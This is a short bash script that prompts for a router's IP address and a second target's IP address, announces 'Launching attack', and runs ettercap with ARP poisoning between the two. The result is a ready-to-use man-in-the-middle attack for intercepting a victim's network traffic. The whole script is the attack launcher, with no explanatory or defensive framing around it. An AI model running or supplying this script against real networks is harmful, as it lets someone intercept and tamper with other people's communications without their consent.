#!/bin/bash
echo "Enter the IP address of your target 1 (Router)"
read varIP1
echo "Enter the IP address of your target 2 (Someone)"
read varIP2
echo "Launching attack..."
sudo ettercap -T -S -M arp:remote /$varIP1// /$varIP2//
